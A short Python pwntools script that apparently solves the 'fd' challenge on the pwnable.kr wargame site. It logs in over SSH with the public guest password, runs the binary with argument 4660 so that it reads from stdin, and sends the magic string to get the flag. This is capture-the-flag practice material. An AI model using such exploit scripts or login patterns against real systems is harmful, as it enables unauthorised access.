from pwn import *

r = ssh(user = 'fd', host='pwnable.kr', port=2222, password='guest')
process = r.process(executable='./fd', argv=['fd','4660'])
process.sendline('LETMEWIN')
print(process.recvlines(2))

